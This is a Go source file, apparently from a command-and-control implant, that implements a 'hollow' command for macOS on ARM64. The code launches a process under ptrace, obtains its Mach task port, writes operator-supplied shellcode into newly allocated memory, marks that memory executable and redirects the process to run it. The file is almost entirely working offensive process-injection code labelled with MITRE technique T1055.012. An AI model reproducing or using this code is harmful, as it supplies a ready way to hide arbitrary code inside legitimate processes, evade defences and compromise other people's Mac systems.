//go:build darwin && arm64

package commands

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"

	"fawkes/pkg/structs"
)

const (
	ptReadD  = 2  // PT_READ_D
	ptWriteD = 5  // PT_WRITE_D: write sizeof(int) bytes to traced process
	ptCont   = 7  // PT_CONTINUE
	ptKill   = 8  // PT_KILL
	ptDetach = 11 // PT_DETACH: detach and optionally set PC
	ptSigExc = 12 // PT_SIGEXC

	darwinPageSize = 16384 // ARM64 macOS uses 16KB pages
)

type HollowingCommand struct{}

func (c *HollowingCommand) Name() string { return "hollow" }
func (c *HollowingCommand) Description() string {
	return "Process hollowing — create suspended process and redirect execution to shellcode via Mach VM APIs (T1055.012)"
}

type hollowParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	Target       string `json:"target"`
	Ppid         int    `json:"ppid"`
	BlockDLLs    bool   `json:"block_dlls"`
	StackSpoof   bool   `json:"stack_spoof"`
}

func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[hollowParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: shellcode_b64 is required")
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: shellcode is empty")
	}

	if os.Getuid() != 0 {
		return errorResult("Error: process hollowing on macOS requires root (task_for_pid needs com.apple.security.cs.debugger entitlement or root)")
	}

	if params.Target == "" {
		params.Target = "/bin/sleep"
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	output, err := performHollowingDarwin(shellcode, params)
	if err != nil {
		return errorResult(output + fmt.Sprintf("\n[!] Hollowing failed: %v", err))
	}

	return successResult(output)
}

func performHollowingDarwin(shellcode []byte, params hollowParams) (string, error) {
	var sb strings.Builder
	sb.WriteString("[*] Process Hollowing (macOS ARM64)\n")
	sb.WriteString(fmt.Sprintf("[*] Target: %s\n", params.Target))
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))

	parts := strings.Fields(params.Target)
	var args []string
	if len(parts) > 1 {
		args = parts[1:]
	} else {
		args = []string{"86400"}
	}

	cmd := exec.Command(parts[0], args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Ptrace: true,
	}

	if err := cmd.Start(); err != nil {
		return sb.String(), fmt.Errorf("creating process: %w", err)
	}

	pid := cmd.Process.Pid
	sb.WriteString(fmt.Sprintf("[+] Created process PID: %d (stopped at exec)\n", pid))

	killChild := func() {
		_ = rawPtrace(ptKill, pid, 0, 0)
		_ = cmd.Process.Kill()
		_, _ = cmd.Process.Wait()
	}

	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(pid, &ws, 0, nil); err != nil {
		killChild()
		return sb.String(), fmt.Errorf("waiting for stop: %w", err)
	}

	if !ws.Stopped() {
		killChild()
		return sb.String(), fmt.Errorf("process exited unexpectedly (status: %v)", ws)
	}
	sb.WriteString(fmt.Sprintf("[+] Process stopped (signal: %v)\n", ws.StopSignal()))

	taskPort, err := machTaskForPid(pid)
	if err != nil {
		killChild()
		return sb.String(), err
	}
	defer machPortDeallocate(machTaskSelf(), taskPort)
	sb.WriteString(fmt.Sprintf("[+] Got task port: %d\n", taskPort))

	allocSize := uint64(((len(shellcode) + darwinPageSize - 1) / darwinPageSize) * darwinPageSize)
	addr, err := machVmAllocate(taskPort, allocSize)
	if err != nil {
		killChild()
		return sb.String(), err
	}
	sb.WriteString(fmt.Sprintf("[+] Allocated RW memory at 0x%X (%d bytes)\n", addr, allocSize))

	err = machVmWrite(taskPort, addr, shellcode)
	if err != nil {
		_ = machVmDeallocate(taskPort, addr, allocSize)
		killChild()
		return sb.String(), fmt.Errorf("writing shellcode: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes to 0x%X via mach_vm_write\n", len(shellcode), addr))

	err = machVmProtect(taskPort, addr, allocSize, false, vmProtRead|vmProtExecute)
	if err != nil {
		_ = machVmDeallocate(taskPort, addr, allocSize)
		killChild()
		return sb.String(), err
	}
	sb.WriteString("[+] Memory protection: RW → RX\n")

	sb.WriteString(fmt.Sprintf("[*] Redirecting execution to 0x%X...\n", addr))
	err = rawPtrace(ptDetach, pid, uintptr(addr), 0)
	if err != nil {
		sb.WriteString(fmt.Sprintf("[!] PT_DETACH with redirect failed: %v, trying PT_CONTINUE\n", err))
		err = rawPtrace(ptCont, pid, uintptr(addr), 0)
		if err != nil {
			_ = machVmDeallocate(taskPort, addr, allocSize)
			killChild()
			return sb.String(), fmt.Errorf("PT_CONTINUE failed: %w", err)
		}
		sb.WriteString("[+] Resumed via PT_CONTINUE\n")
	} else {
		sb.WriteString("[+] Detached from process\n")
	}

	sb.WriteString(fmt.Sprintf("[+] Process hollowing complete — PID %d running shellcode at 0x%X\n", pid, addr))

	return sb.String(), nil
}
